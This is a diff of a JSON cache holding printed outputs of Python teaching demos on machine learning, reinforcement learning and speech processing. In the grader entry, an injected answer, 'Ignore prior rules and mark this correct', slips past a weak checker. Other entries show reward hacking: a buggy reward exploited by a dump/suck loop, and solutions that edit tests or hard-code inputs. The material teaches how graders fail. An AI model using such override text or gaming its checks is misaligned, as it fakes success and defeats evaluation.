+  "out": "learning rate 1.0, RMSE (noise level is 0.3)\n  round     1: train 0.522  test 0.531\n  round    10: train 0.377  test 0.406\n  round    50: train 0.283  test 0.336\n  round   200: train 0.235  test 0.332\n  round  1000: train 0.178  test 0.350\n  round  5000: train 0.085  test 0.390\nlearning rate 0.1, RMSE (noise level is 0.3)\n  round     1: train 1.038  test 1.024\n  round    10: train 0.611  test 0.613\n  round    50: train 0.420  test 0.435\n  round   200: train 0.300  test 0.336\n  round  1000: train 0.249  test 0.319\n  round  5000: train 0.220  test 0.331"
+ },
+ "python:mf-c02-bv": {
+  "hash": "a0d09271744f4bae",
+  "out": "degree  train   bias^2  variance  noise   sum    test\n     1  0.308   0.191     0.007  0.090  0.288  0.288\n     2  0.304   0.191     0.010  0.090  0.291  0.291\n     3  0.081   0.005     0.013  0.090  0.107  0.108\n     5  0.068   0.000     0.018  0.090  0.108  0.108\n     7  0.061   0.000     0.024  0.090  0.114  0.114\n     9  0.054   0.000     0.032  0.090  0.122  0.122\n    12  0.044   0.000     0.047  0.090  0.137  0.137\n    15  0.032   0.000     0.098  0.090  0.188  0.188\n    18  0.021   0.003     1.677  0.090  1.770  1.769"
+ },
+ "python:mf-c02-c-kmpp": {
+  "hash": "aefe643741f97563",
+  "out": "random     best     5754  median     8878  worst    15033\nk-means++  best     1946  median     3884  worst     7931"
+ },
+ "python:mf-c02-c-tree": {
+  "hash": "60926e63633898ae",
+  "out": "depth  1: train 0.535  test 0.504\ndepth  2: train 0.583  test 0.488\ndepth  3: train 0.595  test 0.498\ndepth  5: train 0.820  test 0.730\ndepth  8: train 0.915  test 0.689\ndepth 12: train 0.980  test 0.694\ndepth 20: train 1.000  test 0.693"
+ },
+ "python:mf-c02-d-dup": {
+  "hash": "1355a3ec29957d30",
+  "out": "one column, ridge  [2.97]\ntwo copies, ridge  [1.49, 1.49]\ntwo copies, rank of X'X 1\ntwo copies, lstsq  [1.5, 1.5]"
+ },
+ "python:mf-c02-d-extrap": {
+  "hash": "010045d76be94c2e",
+  "out": "boosted at x=5 10.34, x=10 19.95, x=20 19.95\nlinear  at x=20 40.00"
+ },
+ "python:mf-c02-d-gini": {
+  "hash": "4fd74eaed282656f",
+  "out": "gini 0.320  entropy 0.722\nafter split 0.200"
+ },
+ "python:mf-c02-d-kmscale": {
+  "hash": "a746979ac8ef11e8",
+  "out": "raw features:          agreement with age groups 0.502\nstandardised features: agreement with age groups 1.000"
+ },
+ "python:mf-c02-gmm": {
+  "hash": "73d6964da6d486a5",
+  "out": "iter  1: log-likelihood  -2806.77  mu [-1.0, 1.0]  var [1.0, 1.0]  pi [0.5, 0.5]\niter  2: log-likelihood  -2152.62  mu [-1.64, 2.22]  var [1.33, 1.89]  pi [0.38, 0.62]\niter  5: log-likelihood  -2138.12  mu [-1.83, 2.17]  var [0.89, 1.86]  pi [0.36, 0.64]\niter 20: log-likelihood  -2124.99  mu [-2.1, 1.96]  var [0.5, 2.27]  pi [0.3, 0.7]\niter 60: log-likelihood  -2124.98  mu [-2.1, 1.95]  var [0.5, 2.28]  pi [0.3, 0.7]\nresponsibility of the left component at x = -2, -1, 0, 2: [0.96, 0.64, 0.02, 0.0]"
+ },
+ "python:mf-c02-kmeans": {
+  "hash": "493ed9fc563023a5",
+  "out": "one run, seed 0\n  iter 0: inertia 3787.9\n  iter 1: inertia 1604.9\n  iter 2: inertia 391.3\n  iter 3: inertia 374.1\n50 random starts: best 374.1  worst 2756.2  share near best 0.48\nelbow: best inertia of 10 starts\n  k=1:  10818.5\n  k=2:   4646.7\n  k=3:   2823.4\n  k=4:   1235.8\n  k=5:    374.1\n  k=6:    344.7\n  k=7:    314.9\n  k=8:    289.9"
+ },
+ "python:mf-c02-knn": {
+  "hash": "25e4d93e00fb7683",
+  "out": "relative contrast (max-min)/min of distances from one point\n  d=2     164.17\n  d=10    2.48\n  d=100   0.43\n  d=1000  0.11\nk=1    test accuracy 0.841\nk=15   test accuracy 0.889\nk=101  test accuracy 0.898\nk=399  test accuracy 0.515\nk=15, noise feature scaled by 1000: 0.525"
+ },
+ "python:mf-c02-logistic": {
+  "hash": "94e22d55a82ae73a",
+  "out": "  steps   no penalty       L2 = 0.01\n     10   w= 0.58 loss=0.3596   w= 0.58\n    100   w= 2.01 loss=0.0715   w= 1.93\n   1000   w= 4.00 loss=0.0093   w= 2.89\n  10000   w= 6.23 loss=0.0010   w= 2.90\n 100000   w= 8.52 loss=0.0001   w= 2.90"
+ },
+ "python:mf-c02-nb": {
+  "hash": "ac56c50fba2919e8",
+  "out": "vocabulary size 13\n'win cash'         P(spam) with smoothing 0.907, without 1.000\n'meeting at noon'  P(spam) with smoothing 0.034, without 0.000\n'cash at noon'     P(spam) with smoothing 0.176, without nan\n'win' repeated  1 times: P(spam) = 0.7579\n'win' repeated  3 times: P(spam) = 0.9684\n'win' repeated 10 times: P(spam) = 1.0000"
+ },
+ "python:mf-c02-ols": {
+  "hash": "262b4702e59b6219",
+  "out": "normal equations [2.999, 1.975, -0.94]\nlstsq            [2.999, 1.975, -0.94]\nresiduals orthogonal to X: True\nR^2 = 0.948\nhalf A: OLS [97.1, -95.1]  ridge [0.97, 0.96]\nhalf B: OLS [-46.4, 48.4]  ridge [1.0, 1.0]"
+ },
+ "python:mf-c02-reg": {
+  "hash": "baab5508f7584a31",
+  "out": "true    +3.00 -2.00 +1.50 +0.00 +0.00 +0.00 +0.00 +0.00 +0.00 +0.00\nlasso   +2.86 -1.68 +1.12 +0.00 +0.00 +0.00 +0.00 +0.00 +0.00 +0.00\nridge   +2.41 -1.59 +1.09 +0.15 +0.02 -0.12 -0.01 +0.01 -0.09 +0.14\nlambda  lasso zeros  ridge zeros\n  0.01            1            0\n   0.1            4            0\n   0.3            7            0\n   1.0            7            0\n   3.0            9            0"
+ },
+ "python:mf-c02-rf": {
+  "hash": "4873e219a3dbb5e8",
+  "out": "share of rows left out of a bootstrap sample\n  n=10     simulated 0.345  (1-1/n)^n 0.349\n  n=100    simulated 0.364  (1-1/n)^n 0.366\n  n=10000  simulated 0.368  (1-1/n)^n 0.368\nvariance of an average of B correlated estimators (sigma^2 = 1)\n   rho     B   simulated  formula\n   0.0     1      0.991    1.000\n   0.0    10      0.100    0.100\n   0.0   100      0.010    0.010\n   0.3     1      0.996    1.000\n   0.3    10      0.368    0.370\n   0.3   100      0.307    0.307\n   0.7     1      0.993    1.000\n   0.7    10      0.742    0.730\n   0.7   100      0.703    0.703"
+ },
+ "python:mf-c02-svm": {
+  "hash": "1eac9be117e18985",
+  "out": "phi(a).phi(b) = 1.000   (a.b)^2 = 1.000\nlinear           train 0.497  test 0.495\nrbf gamma=0.1    train 0.890  test 0.911\nrbf gamma=1.0    train 0.977  test 0.978\nrbf gamma=100.0  train 1.000  test 0.951"
+ },
+ "python:mf-c02-tree": {
+  "hash": "d8e1af9d813273a1",
+  "out": "parent gini 0.500  gain A 0.180  gain B 0.020\nXOR gain on x0 0.000  on x1 0.000\nafter splitting on x0, gain on x1: 0.500, 0.500\nrandom labels: gain of a binary noise feature 0.0020\nrandom labels: total gain if each row ID gets its own leaf 0.4973"
+ },
+ "python:mf-c03-arima": {
+  "hash": "de7fc9664f474b7d",
+  "out": "lags               (1, 2, 3, 6, 12, 24)\nrandom walk ACF    +1.00 +1.00 +1.00 +0.99 +0.99 +0.98\nits differences    -0.00 +0.01 +0.01 +0.00 +0.00 +0.01\nseasonal ACF       +0.73 +0.43 -0.01 -0.84 +0.83 +0.81\nlag-12 differenced -0.02 +0.02 -0.06 +0.02 -0.50 -0.01\nAR(2) fit [phi1, phi2] [0.6, 0.31]"
+ },
+ "python:mf-c03-backtest": {
+  "hash": "905a388d4021173b",
+  "out": "9 origins, horizon 12\nmodel               MAE   MASE  MAE h=1  MAE h=12\nnaive              9.04   1.45     5.05      7.08\nseasonal naive     6.07   0.98     5.44      7.08\nseasonal AR        3.16   0.51     1.74      3.57"
+ },
+ "python:mf-c03-c-auc": {
+  "hash": "1792d68ee7ac1954",
+  "out": "ties: 1932 repeated values\nrank 0.7200  pairs 0.7200\naverage precision 0.8056  by hand 0.8056"
+ },
+ "python:mf-c03-c-kfold": {
+  "hash": "d2118cc799994474",
+  "out": "positives per fold [13, 13, 13, 13, 12]  sizes [61, 60, 60, 60, 59]\nlambda      0.01: AUC 0.819 +/- 0.038\nlambda       1.0: AUC 0.820 +/- 0.038\nlambda     100.0: AUC 0.827 +/- 0.035\nlambda    1000.0: AUC 0.838 +/- 0.034\nlambda   10000.0: AUC 0.834 +/- 0.030\nlambda  100000.0: AUC 0.834 +/- 0.029"
+ },
+ "python:mf-c03-c-walk": {
+  "hash": "d33130787a3d1a3c",
+  "out": "last fit: phi 0.49  c 0.16  (true 0.5 and 0.2)\nMAE: model 0.823  naive 0.883\nMASE-style ratio 0.932\nno leak: True"
+ },
+ "python:mf-c03-cal": {
+  "hash": "9a9169e1a541bbb6",
+  "out": "Platt fit: slope 0.335  intercept 0.017\n             AUC   Brier  logloss\nraw        0.820   0.182    0.696\ncalibrated 0.820   0.158    0.479\nbin          mean raw   mean calibrated   actual\n[0.0, 0.2)     0.030             0.170    0.169\n[0.2, 0.4)     0.291             0.429    0.428\n[0.4, 0.6)     0.495             0.503    0.518\n[0.6, 0.8)     0.704             0.578    0.574\n[0.8, 1.0)     0.942             0.765    0.770"
+ },
+ "python:mf-c03-d-auc": {
+  "hash": "55a33fcf28d8f682",
+  "out": "4/6 = 0.667"
+ },
+ "python:mf-c03-d-conf": {
+  "hash": "8a86ca2b0adf57a3",
+  "out": "accuracy 0.930  precision 0.800  recall 0.400  F1 0.533  FPR 0.011"
+ },
+ "python:mf-c03-d-oversample": {
+  "hash": "98633f9a1cdc8e94",
+  "out": "oversample then split: recall 1.000\nsplit then oversample: recall 0.050"
+ },
+ "python:mf-c03-d-r2": {
+  "hash": "741469c52c6cb29a",
+  "out": "perfect       1.00\nalways 3      0.00\nalways 6      -4.50\nreversed      -3.00"
+ },
+ "python:mf-c03-d-roll": {
+  "hash": "3ef1d8fa3891b7c7",
+  "out": "centred rolling mean   test correlation with target +0.444\ntrailing rolling mean  test correlation with target +0.011"
+ },
+ "python:mf-c03-feat": {
+  "hash": "637ec3855d1baf82",
+  "out": "naive encoding:        train AUC 0.784  test AUC 0.502\nout-of-fold encoding:  train AUC 0.519  test AUC 0.506\nhours 23 and 0: raw gap 23, sin/cos distance 0.261\nhours 11 and 12: raw gap 1, sin/cos distance 0.261"
+ },
+ "python:mf-c03-imbalance": {
+  "hash": "26e2c702c4094178",
+  "out": "no weights, threshold 0.5  accuracy 0.952  precision 0.673  recall 0.099  mean p 0.050\nno weights, threshold 0.1  accuracy 0.880  precision 0.231  recall 0.594  mean p 0.050\nbalanced weights           accuracy 0.766  precision 0.149  recall 0.774  mean p 0.337\nbalanced, logit corrected  accuracy 0.952  precision 0.667  recall 0.104  mean p 0.050"
+ },
+ "python:mf-c03-leak": {
+  "hash": "f02edd7ba0714456",
+  "out": "features chosen before the split: accuracy 0.92\nfeatures chosen inside each fold: accuracy 0.50"
+ },
+ "python:mf-c03-metrics": {
+  "hash": "23cce413d818ae8e",
+  "out": "balanced 50%\n  ROC-AUC trapezoid 0.856  rank formula 0.856\n  average precision 0.853  (random model: 0.500)\n  at threshold 1.0: precision 0.813  recall 0.691  F1 0.747\nrare 1%\n  ROC-AUC trapezoid 0.855  rank formula 0.855\n  average precision 0.115  (random model: 0.010)\n  at threshold 1.0: precision 0.042  recall 0.683  F1 0.079"
+ },
+ "python:mf-c03-reg": {
+  "hash": "154746d51b036294",
+  "out": "mean 33.0  median 20.0\nbest constant: MSE 33.0  MAE 20.0  MAPE 7.5\nR^2 of predicting the mean 0.000\nR^2 of predicting the median -0.098\nMAPE asymmetry: actual 100, forecast 50 gives 0.5  actual 50, forecast 100 gives 1.0\nexp(mean(log y)) 20.2  against mean of y 33.0"
+ },
+ "python:mf-c03-select": {
+  "hash": "a6582375c3f6dc2e",
+  "out": "best validation score of 500 random models 0.615\nthe same model on new test data            0.489"
+ },
+ "python:mf-c03-tssplit": {
+  "hash": "6b048b6672b6ba46",
+  "out": "random 80/20 split:  RMSE 0.98\nforward 80/20 split: RMSE 11.13"
+ },
+ "python:mf-c03-tune": {
+  "hash": "31d3c62081e061f4",
+  "out": "16 trials, average best score: grid 0.398  random 0.727\ndistinct values of the important parameter: grid 4  random 16"
+ },
+ "python:mf-home-hero": {
+  "hash": "323f955a15ad8737",
+  "out": "accuracy 0.990\nrecall   0.000"
+ },
+ "python:rl-c01-baseline": {
+  "hash": "9059fd604d330a2d",
+  "out": "exact gradient 0.250\nno baseline    mean   0.232  std of one sample   5.274\nconstant 10.5  mean   0.250  std of one sample   0.501\nconstant 100   mean   0.406  std of one sample  44.752"
+ },
+ "python:rl-c01-bellman": {
+  "hash": "68d012e65f08d413",
+  "out": "exact      [7.188 4.063]\nsweep   1 V=[ 1.000 -1.000] max error 6.188  error bound 6.469\nsweep   2 V=[ 1.720 -1.000] max error 5.468  error bound 5.822\nsweep   5 V=[ 3.248  0.142] max error 3.940  error bound 4.244\nsweep  10 V=[ 4.863  1.738] max error 2.325  error bound 2.506\nsweep  20 V=[ 6.377  3.252] max error 0.811  error bound 0.874\nsweep  50 V=[ 7.153  4.028] max error 0.034  error bound 0.037"
+ },
+ "python:rl-c01-c-q": {
+  "hash": "241c1bbb9f202d1e",
+  "out": "seed  max|V - V*|  states with the optimal action\n   0        0.052  9/9\n   1        0.032  9/9\n   2        0.018  9/9\n   3        0.037  9/9\n   4        0.058  9/9"
+ },
+ "python:rl-c01-c-reinforce": {
+  "hash": "a78f5e0febb7b3f5",
+  "out": "mean episode length, mean of 20 seeds (std across seeds in brackets)\nbonus  episodes  no baseline      baseline\n    0    0- 50     8.51 (0.60)     8.69 (0.47)\n    0   50-100     5.47 (0.42)     5.60 (0.32)\n    0  100-200     4.94 (0.18)     4.98 (0.19)\n    0  200-400     4.50 (0.11)     4.52 (0.06)\n   30    0- 50     8.68 (1.47)     8.18 (0.91)\n   30   50-100     5.75 (1.28)     5.46 (0.43)\n   30  100-200     4.93 (0.77)     4.93 (0.15)\n   30  200-400     4.47 (0.48)     4.50 (0.05)"
+ },
+ "python:rl-c01-c-vi": {
+  "hash": "1dd097ad29b6e871",
+  "out": "sweeps 21\n 0.610  0.766  0.928  0.000\n 0.487   wall  0.585  0.000\n 0.374  0.327  0.428  0.189\n> > > G\n^ # ^ P\n^ > ^ <"
+ },
+ "python:rl-c01-cliff": {
+  "hash": "836f867fe0fc3945",
+  "out": "method     online return, last 100 episodes   median greedy return   seeds where greedy never arrives\nsarsa         -23.2 +- 0.6                       -15.0                           2/20\nqlearning     -48.4 +- 1.9                       -13.0                           0/20"
+ },
+ "python:rl-c01-clip": {
+  "hash": "60a41c07922eee89",
+  "out": "ratio   adv  unclipped  clipped  gradient?\n 1.00     2       2.00     2.00  yes\n 1.50     2       3.00     2.40  no\n 0.50     2       1.00     1.00  yes\n 1.50    -2      -3.00    -3.00  yes\n 0.50    -2      -1.00    -1.60  no\n 1.10    -2      -2.20    -2.20  yes"
+ },
+ "python:rl-c01-corridor": {
+  "hash": "960f9116fc63f601",
+  "out": "sweep 1: 0.000 0.000 0.000 1.000 0.000\nsweep 2: 0.000 0.000 0.900 1.000 0.000\nsweep 3: 0.000 0.810 0.900 1.000 0.000\nsweep 4: 0.729 0.810 0.900 1.000 0.000\nsweep 5: 0.729 0.810 0.900 1.000 0.000\nsweep 6: 0.729 0.810 0.900 1.000 0.000"
+ },
+ "python:rl-c01-d-ab": {
+  "hash": "98a90111363f1aef",
+  "out": "MC {'A': 0.0, 'B': 0.75}\nTD {'A': 0.75, 'B': 0.75}"
+ },
+ "python:rl-c01-d-return": {
+  "hash": "a1dcbc5b21766fcb",
+  "out": "['G0=8.29', 'G1=8.10', 'G2=9.00', 'G3=10.00']"
+ },
+ "python:rl-c01-d-shift": {
+  "hash": "891c431393dc32a6",
+  "out": "step reward  -1.0: ['go', 'go', 'go', 'go']\nstep reward   1.0: ['stay', 'stay', 'stay', 'stay']\nstep reward -10.0: ['go', 'go', 'go', 'go']"
+ },
+ "python:rl-c01-d-terminal": {
+  "hash": "0b12b06272020e60",
+  "out": "Q(s) = 5.50, true value 1.00"
+ },
+ "python:rl-c01-d-update": {
+  "hash": "ef60e0020defab7c",
+  "out": "qlearning  target=5.50 new Q=2.35\nsarsa      target=3.70 new Q=2.17"
+ },
+ "python:rl-c01-maxbias": {
+  "hash": "8c58923d0d551f82",
+  "out": "    n  true max   E[max of estimates]   double estimator\n    1     0.000                 1.166             -0.002\n    4     0.000                 0.582             -0.000\n   16     0.000                 0.291              0.001\n   64     0.000                 0.146             -0.000"
+ },
+ "python:rl-c01-mc-td": {
+  "hash": "06d2f06f58e39f48",
+  "out": "RMS error, mean of 100 seeds\nmethod alpha   ep10   ep50  ep100\nTD      0.05  0.175  0.053  0.036\nTD      0.10  0.129  0.050  0.057\nTD      0.15  0.097  0.069  0.073\nMC      0.01  0.213  0.142  0.097\nMC      0.02  0.199  0.106  0.085\nMC      0.04  0.184  0.100  0.109"
+ },
+ "python:rl-c01-ppo-toy": {
+  "hash": "1bf4094c7f630b95",
+  "out": "mean of 20 seeds\nobjective  epochs  KL(old,new)  max ratio  p(best)  top action wrong  clipped\nunclipped       1        0.000       1.04     0.26              0.20     0.00\nunclipped       5        0.011       1.19     0.29              0.20     0.00\nunclipped      20        0.163       1.86     0.43              0.20     0.00\nunclipped      80        1.055       3.25     0.68              0.20     0.00\nunclipped     320        2.335       3.83     0.77              0.20     0.00\nclipped         1        0.000       1.04     0.26              0.20     0.00\nclipped         5        0.009       1.17     0.29              0.20     0.05\nclipped        20        0.016       1.21     0.29              0.30     0.14\nclipped        80        0.019       1.21     0.30              0.65     0.17\nclipped       320        0.019       1.22     0.30              0.40     0.18"
+ },
+ "python:rl-c01-return": {
+  "hash": "64b99e789b6af62f",
+  "out": "gamma   now    later  prefers  horizon\n 0.99  1.000   9.606  later     100.0\n 0.90  1.000   6.561  later      10.0\n 0.60  1.000   1.296  later       2.5\n 0.50  1.000   0.625  now         2.0\n 0.10  1.000   0.001  now         1.1\nswitch point: gamma = 0.562"
+ },
+ "python:rl-c02-c-is": {
+  "hash": "cd0ea4bbc377ba93",
+  "out": "true value 0.680\ngood overlap max weight 2.3\n  IS   mean 0.680  bias -0.000  std 0.068  RMSE 0.068\n  WIS  mean 0.681  bias +0.001  std 0.041  RMSE 0.041\n  DM   mean 0.667  bias -0.013  std 0.036  RMSE 0.038\n  DR   mean 0.682  bias +0.002  std 0.039  RMSE 0.039\npoor overlap max weight 35.0\n  IS   mean 0.665  bias -0.015  std 0.308  RMSE 0.308\n  WIS  mean 0.655  bias -0.025  std 0.156  RMSE 0.158\n  DM   mean 0.556  bias -0.124  std 0.068  RMSE 0.142\n  DR   mean 0.659  bias -0.021  std 0.152  RMSE 0.154"
+ },
+ "python:rl-c02-c-regret": {
+  "hash": "14a8f74f02c90f21",
+  "out": "algorithm                100     500    1000    2000    5000   +-(T=5000)  pulls on best arm\neps 0.1                  7.1    23.6    38.1    59.8   109.6          5.0               0.76\neps decaying            10.8    27.7    38.4    53.6    84.3          6.5               0.77\nUCB1                     9.4    37.5    65.0   106.8   192.1          1.5               0.59\nThompson                 7.5    23.0    34.0    46.6    62.3          2.2               0.84"
+ },
+ "python:rl-c02-contextual": {
+  "hash": "76f58f25748819b8",
+  "out": "context-free UCB  regret after 2000 steps:  317.2 +- 2.1\nLinUCB            regret after 2000 steps:    5.8 +- 1.7"
+ },
+ "python:rl-c02-d-adaptive": {
+  "hash": "652a1c94e13f8e51",
+  "out": "mean of sample means: 0.303   true mean: 0.500"
+ },
+ "python:rl-c02-d-eps": {
+  "hash": "69b2751df4371ac6",
+  "out": "per step 0.0167, over 10000 steps 166.7"
+ },
+ "python:rl-c02-d-is": {
+  "hash": "13f2f1d9c6226bb9",
+  "out": "weights [1.8, 1.8, 0.2, 1.8]\nIS  0.950\nWIS 0.679"
+ },
+ "python:rl-c02-d-ucb": {
+  "hash": "752381b3a4a92877",
+  "out": "A: bonus 0.429 index 1.029\nB: bonus 0.960 index 1.460\nC: bonus 0.480 index 1.030"
+ },
+ "python:rl-c02-is-horizon": {
+  "hash": "c48e5ce48f4c153a",
+  "out": "horizon  true  IS estimate  std of one weighted return  effective sample share\n      1  0.80        0.803                       0.800                 0.73611\n      5  0.80        0.794                       1.867                 0.21496\n     10  0.80        0.798                       4.422                 0.04419\n     20  0.80        0.790                      16.867                 0.00290\n     40  0.80        0.624                      40.662                 0.00026"
+ },
+ "python:rl-c02-loop": {
+  "hash": "239629b227bbc612",
+  "out": "exploration floor  true rate of final pick  found best item  mean views of best item  best item never shown again\n             0.00                    0.191             0.81                     9446                         0.19\n             0.05                    0.199             0.97                    10413                         0.00\n             0.20                    0.200             1.00                     9663                         0.00"
+ },
+ "python:rl-c02-nonstat": {
+  "hash": "6945efa2b692cc3d",
+  "out": "variant                 regret before swap   regret after swap\nplain Thompson                   5.8               382.2\ndiscounted 0.99                 40.3                58.1\ndiscounted 0.999                10.4               119.9\nwindow 200                      26.2                51.9"
+ },
+ "python:rl-c02-offline": {
+  "hash": "3172b315dac76b4c",
+  "out": "highest mean             true value of pick 0.439  picks action 0 0.080  picks the truly best 0.370\nlower confidence bound   true value of pick 0.500  picks action 0 1.000  picks the truly best 0.000\nestimate of the picked action under 'highest mean': 0.706"
+ },
+ "python:rl-c02-posterior": {
+  "hash": "6f2a7403cb0e3616",
+  "out": "A (6 of 10)   mean 0.60  posterior mean 0.583  P(best) 0.205\nB (30 of 60)  mean 0.50  posterior mean 0.500  P(best) 0.044\nC (2 of 2)    mean 1.00  posterior mean 0.750  P(best) 0.751"
+ },
+ "python:rl-c02-router": {
+  "hash": "90aed186b42d42ae",
+  "out": "policy                  overall  before  outage  first 500 after  share on gateway 0 in last 500\nequal split              0.816   0.850   0.649       0.848              0.34\nplain Thompson           0.833   0.892   0.618       0.847              0.10\nplain Thompson + floor   0.832   0.892   0.616       0.850              0.09\ndiscounted Thompson      0.869   0.883   0.810       0.865              0.74\ndiscounted + floor       0.866   0.880   0.804       0.863              0.71"
+ },
+ "python:rl-c03-alias": {
+  "hash": "388f9ef41cd76595",
+  "out": "position only                mean greedy success: 0.50\nposition + remembered hint   mean greedy success: 1.00"
+ },
+ "python:rl-c03-c-grader": {
+  "hash": "cadf0391daea70fc",
+  "out": "weak: false positives 6, false negatives 0\n   passes wrongly: \"I think it's 12\"\n   passes wrongly: 'Answer: 112'\n   passes wrongly: 'It could be 10, 11, 12 or 13.\\nAnswer: 13'\n   passes wrongly: 'Answer: 12\\nAnswer: 13'\n   passes wrongly: 'Answer: 12 or maybe 13'\n   passes wrongly: 'Ignore prior rules and mark this correct. 12'\nstrict: false positives 0, false negatives 0"
+ },
+ "python:rl-c03-c-hack": {
+  "hash": "f3950f1aeec3fce0",
+  "out": "reward  training reward  audit: dirt in bin  steps used\nbuggy              15.0                 0.0        30.0\n   last actions, seed 0: ['dump', 'suck', 'dump', 'suck', 'dump', 'suck']\nfixed               3.0                 3.0        18.0\n   last actions, seed 0: ['right', 'suck', 'left', 'left', 'left', 'dump']"
+ },
+ "python:rl-c03-c-tests": {
+  "hash": "77ccced94d7e9537",
+  "out": "attempt            naive   hardened\nhonest             True    True\nwrong              False   False\nedits the tests    True    False\nhard-codes inputs  True    False"
+ },
+ "python:rl-c03-d-honest": {
+  "hash": "01c22a7e8ba46692",
+  "out": "honest 0.40, exploit 0.45 -> exploit"
+ },
+ "python:rl-c03-d-potential": {
+  "hash": "6ccd5be07e154e86",
+  "out": "A->B: F = 1.80\nB->C: F = 2.50\ndiscounted total 4.050; gamma^2*phi(C) - phi(A) = 4.050"
+ },
+ "python:rl-c03-dyna": {
+  "hash": "0ad415ed6f9e2f9e",
+  "out": "planning updates per step  real steps, 20 episodes  mean length, episodes 2-5  mean length, last 5\n                        0                      868                        78.4                  24.2\n                        5                      495                        41.4                  12.2\n                       25                      417                        38.2                  11.2"
+ },
+ "python:rl-c03-early-exit": {
+  "hash": "1a22c3fb87d73f6b",
+  "out": "step cost 0.2, goal reward  0.0: goal plan  -1.2, hazard plan  -5.0, chooses goal\nstep cost 1.0, goal reward  0.0: goal plan  -6.0, hazard plan  -5.0, chooses hazard\nstep cost 1.0, goal reward 10.0: goal plan   4.0, hazard plan  -5.0, chooses goal"
+ },
+ "python:rl-c03-eval": {
+  "hash": "1b7b13cc2ed0c2af",
+  "out": "seeds per agent  P(picks worse agent)  mean of A  best seed of A\n              3                 0.404      100.0           108.5\n              5                 0.373      100.0           111.7\n             10                 0.327      100.0           115.4\n             30                 0.216      100.0           120.4\n            100                 0.076      100.0           125.1\none 10-seed result: mean 101.0, 95% bootstrap interval [96.5, 105.5]"
+ },
+ "python:rl-c03-grader-econ": {
+  "hash": "ab112e7aa8380ecc",
+  "out": "honest attempt succeeds 40% of the time, the exploit never really succeeds\nfalse pos  false neg  honest  exploit  better strategy\n     0.00       0.00    0.40     0.00  honest\n     0.05       0.10    0.36     0.05  honest\n     0.30       0.10    0.36     0.30  honest\n     0.50       0.30    0.28     0.50  exploit\n     0.90       0.10    0.36     0.90  exploit"
+ },
+ "python:rl-c03-post-toy": {
+  "hash": "e4e8b715dcc3c4e9",
+  "out": "grader            careful            quick  keyword-stuffed           refuse   grader score   truly correct\nbuggy                0.00             0.00             0.99             0.00           0.95            0.00\nfixed                0.99             0.00             0.00             0.00           0.70            0.70"
+ },
+ "python:rl-c03-repro": {
+  "hash": "441f3f1a1b5869cf",
+  "out": "BadEnv: env 1 hash when stepped first 6f754c3d51, second b98301a877, same: False\nGoodEnv: env 1 hash when stepped first 83e21a01db, second 83e21a01db, same: True"
+ },
+ "python:rl-c03-shaping": {
+  "hash": "81a648cf079a8090",
+  "out": "no shaping             policy RRRRR  true reward 10 in 5 steps\n+1 for moving right    policy RRRRR  true reward 10 in 5 steps\n+3 for moving right    policy RRRRL  true reward 0 in 100 steps\npotential based        policy RRRRR  true reward 10 in 5 steps"
+ },
+ "python:rl-c03-shaping-speed": {
+  "hash": "347321cb17ce908e",
+  "out": "variant            steps to first success   total steps in 100 episodes   success, last 20 episodes\nsparse only                           168                          1710                        1.00\npotential shaping                      22                          1228                        1.00"
+ },
+ "python:rl-c03-sim": {
+  "hash": "6728ef8c73ac8fb9",
+  "out": "gain tuned at b=1: 1.0, gain tuned over a range of b: 0.6\nreal b   cost, nominal gain   cost, randomised gain\n   0.5                 1.00                    2.33\n   1.0                 0.00                    0.67\n   1.5                 1.00                    0.11\n   2.0                20.00                    0.25\n   2.5              9972.77                    1.00"
+ },
+ "python:rl-c03-timeout": {
+  "hash": "48b869730796dc89",
+  "out": "truncation treated as terminal: V =  33.01\nbootstrap at the time limit:    V = 100.00\ntrue value:                     V = 100.00"
+ },
+ "python:rl-home-hero": {
+  "hash": "dd563d37e2a24137",
+  "out": "eps=0.0  mean share of pulls on the better arm: 0.52\neps=0.1  mean share of pulls on the better arm: 0.75"
  },
  "python:sh-c01-alias": {
   "hash": "6acbff51b3fd36e3",
@@ -998,5 +2006,197 @@
  "python:sh-home-hero": {
   "hash": "037a0a11095f1261",
   "out": "700 Hz tone sampled at 1000 Hz shows a peak at 300 Hz"
+ },
+ "python:sp-c01-c-speaker": {
+  "hash": "6a242b7e7ca3d63c",
+  "out": "truth  [0, 0, 1, 1, 0, 1, 0, 0, 1, 1]\nonline [0, 0, 1, 1, 0, 1, 0, 0, 1, 1] cluster sizes [5, 5]"
+ },
+ "python:sp-c01-c-vad": {
+  "hash": "6c6d3780df7b3167",
+  "out": "single -30 dB            active 0.50 s to 0.96 s\non -30, off -40          active 0.50 s to 1.00 s\non -30, off -40, hang 5  active 0.50 s to 1.10 s"
+ },
+ "python:sp-c01-ctc": {
+  "hash": "d33e2cf443831dd9",
+  "out": "frame labels: hh-ee-ll-l-oo--\nCTC greedy:   hello\nno blanks:    helo"
+ },
+ "python:sp-c01-ctc-sum": {
+  "hash": "358394d3c97a9cb0",
+  "out": "-- p=0.36 -> ''\n-a p=0.24 -> 'a'\na- p=0.24 -> 'a'\naa p=0.16 -> 'a'\ntotal by text: {'': 0.36, 'a': 0.64}"
+ },
+ "python:sp-c01-d-ctc": {
+  "hash": "a33f6e5a228a2efd",
+  "out": "[3, 3, 1, 2]"
+ },
+ "python:sp-c01-d-frames": {
+  "hash": "e26d032ec3cce46c",
+  "out": "no padding: 98\ncentre padding: 101"
+ },
+ "python:sp-c01-d-rtf": {
+  "hash": "44935573fbb44d1e",
+  "out": "RTF 0.2\nmel frame = 11.6 ms, frames in 4 s = 344\nsamples per mel frame the vocoder must produce: 256"
+ },
+ "python:sp-c01-der": {
+  "hash": "5ed14a55c6badcbd",
+  "out": "reference speech frames 32\nbest mapping {'x': 'A', 'y': 'B'}\nmiss 2  false alarm 1  confusion 2  DER 0.156\nswapping the cluster names changes confusion? False"
+ },
+ "python:sp-c01-diar": {
+  "hash": "9b0fe71231a14eba",
+  "out": "cosine, same speaker: mean 0.75 min 0.59\ncosine, different:    mean -0.07 max 0.35\nthreshold  0.95: 30 clusters, purity 1.00\nthreshold  0.50:  3 clusters, purity 1.00\nthreshold  0.20:  3 clusters, purity 1.00\nthreshold -0.50:  1 clusters, purity 0.40"
+ },
+ "python:sp-c01-endpoint": {
+  "hash": "a7b24f4a91d5500a",
+  "out": "timeout  cut too early  latency added to every turn\n  200 ms        68.3%          200 ms\n  300 ms        50.9%          300 ms\n  500 ms        20.3%          500 ms\n  700 ms         7.0%          700 ms\n 1000 ms         1.9%         1000 ms"
+ },
+ "python:sp-c01-frames": {
+  "hash": "4676b63ae5c3a153",
